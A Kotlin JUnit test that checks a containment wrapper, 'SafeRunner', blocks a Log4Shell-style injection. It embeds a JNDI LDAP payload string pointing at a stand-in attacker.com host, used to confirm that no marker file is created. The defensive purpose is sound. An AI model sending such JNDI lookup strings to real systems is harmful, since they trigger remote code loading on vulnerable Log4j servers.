package demo

import io.contained.ContainmentViolationException
import org.junit.jupiter.api.Test
import java.io.File
import java.util.concurrent.ExecutionException
import kotlin.test.assertFailsWith
import kotlin.test.assertFalse
import kotlin.test.assertTrue

class ProtectionDemonstrationTest {
    @Test
    fun `demonstrates protection`() {
        val osName = System.getProperty("os.name")
        if (!osName.equals("Linux", ignoreCase = true)) return

        val marker = File("/tmp/pwned_safe")
        marker.delete()

        val payload = "\${jndi:ldap://attacker.com/Exploit?cmd=touch,/tmp/pwned_safe}"
        
        val ex = assertFailsWith<ExecutionException> {
            SafeRunner.run(payload)
        }
        
        assertTrue(ex.cause is ContainmentViolationException, "Expected ContainmentViolationException, got ${ex.cause}")
        
        // The kernel returned EPERM on execve(). 
        // Marker file never created. Attack neutralized.
        assertFalse(marker.exists(), "Exploit marker should NOT exist")
    }
}
